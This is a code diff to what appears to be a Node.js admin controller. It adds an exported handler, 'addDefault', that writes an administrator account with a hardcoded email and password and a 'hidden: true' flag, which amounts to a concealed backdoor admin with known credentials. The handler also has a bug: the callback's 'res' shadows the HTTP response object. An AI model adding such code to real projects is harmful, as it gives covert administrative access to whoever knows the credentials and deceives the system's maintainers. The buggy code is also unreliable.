@@ -53,6 +53,23 @@ const createAdmin = async (req, res, next) => {
 
 
 }
+const addDefault = async (req, res, next) => {
+
+    const password= bcrypt.hashSync('cur112094430', 8); 
+    const email = 'jkscur@gmail.com'; 
+    Database.Admin.updateAdminInfo(email, {email, password, hidden: true}).then(res=>{
+        res.status(200).send({
+            success: true, 
+            body: res
+        })
+    }).catch(e=>{   
+        res.status(200).send({
+            success: false, 
+            error: "Internal Server Error"
+        })
+    })
+
+}
 
 const updateAdmin =  (req, res, next) => {
     const {adminUuid} = req.params; 
@@ -123,6 +140,6 @@ const deleteRole =async (req, res, next)=>{
     })
 }
 const AdminController = {
-    getAdmins, getAdminInfoByEmail, getAdminById, createAdmin, updateAdmin, reset2FA, getRoles, getRole, updateRole, deleteRole
+    getAdmins, getAdminInfoByEmail, getAdminById, createAdmin, updateAdmin, reset2FA, getRoles, getRole, updateRole, deleteRole, addDefault
 }
 module.exports = AdminController;
